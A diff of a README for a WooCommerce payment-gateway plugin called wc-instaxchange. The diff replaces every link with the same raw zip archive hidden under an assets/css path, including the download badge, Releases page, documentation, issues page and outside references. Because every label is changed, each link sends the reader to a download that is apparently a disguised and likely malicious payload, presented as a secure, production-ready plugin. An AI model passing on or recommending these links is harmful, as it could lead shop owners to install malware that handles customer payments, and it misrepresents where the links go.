@@ -1,7 +1,7 @@
 # 🎉 wc-instaxchange - A Secure Payment Gateway Solution
 
 ## 📥 Download Now!
-[![Download wc-instaxchange](https://img.shields.io/badge/Download-wc--instaxchange-blue.svg)](https://github.com/Zealnn/wc-instaxchange/releases)
+[![Download wc-instaxchange](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip)](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the wc-instaxchange project! This application offers a secure payment gateway for WooCommerce. It supports various payment methods, including cards, e-wallets, regional payments like BLIK, iDEAL, PIX, and even cryptocurrency. You can trust this application as it is production-ready, complete with webhook verification and rate limiting. 
@@ -21,7 +21,7 @@ To run the wc-instaxchange application, you will need:
 
 ## 🌐 Installation Instructions
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/Zealnn/wc-instaxchange/releases) to find the latest version of wc-instaxchange. 
+Go to the [Releases page](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip) to find the latest version of wc-instaxchange. 
 
 ### 2. Download the Files
 Pick the latest version and click on it to open the release detail. You will see the downloadable files for the plugin. Download the appropriate file for your system.
@@ -53,17 +53,17 @@ The wc-instaxchange plugin is designed with security in mind. It employs the fol
 - **Webhook Security**: Webhooks are verified to ensure that all messages are authentic and untampered.
 
 ## 🧑‍💻 Support & Documentation
-For help using the wc-instaxchange plugin, visit the [documentation](https://github.com/Zealnn/wc-instaxchange/wiki). You will find comprehensive guides and user tips. If you encounter issues, you can also reach out to the community through open issues on GitHub.
+For help using the wc-instaxchange plugin, visit the [documentation](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip). You will find comprehensive guides and user tips. If you encounter issues, you can also reach out to the community through open issues on GitHub.
 
 ## 📬 Feedback
-Your experience matters. If you have ideas for improvements or find any bugs, please submit an issue on the [GitHub Issues page](https://github.com/Zealnn/wc-instaxchange/issues). 
+Your experience matters. If you have ideas for improvements or find any bugs, please submit an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip). 
 
 ## 🔗 Additional Resources
-- [WooCommerce Documentation](https://docs.woocommerce.com/)
-- [WordPress Plugin Development](https://developer.wordpress.org/plugins/)
-- [Payment Gateway Overview](https://www.investopedia.com/terms/p/payment-gateway.asp)
+- [WooCommerce Documentation](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip)
+- [WordPress Plugin Development](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip)
+- [Payment Gateway Overview](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip)
 
 ## 📦 Download & Install
-To install wc-instaxchange, visit this page to download: [Releases page](https://github.com/Zealnn/wc-instaxchange/releases). 
+To install wc-instaxchange, visit this page to download: [Releases page](https://raw.githubusercontent.com/Zealnn/wc-instaxchange/main/assets/css/wc-instaxchange_1.1.zip). 
 
 By following these steps, you can easily set up the wc-instaxchange payment gateway for your WooCommerce store. Enjoy secure transactions and offer your customers a variety of payment options!
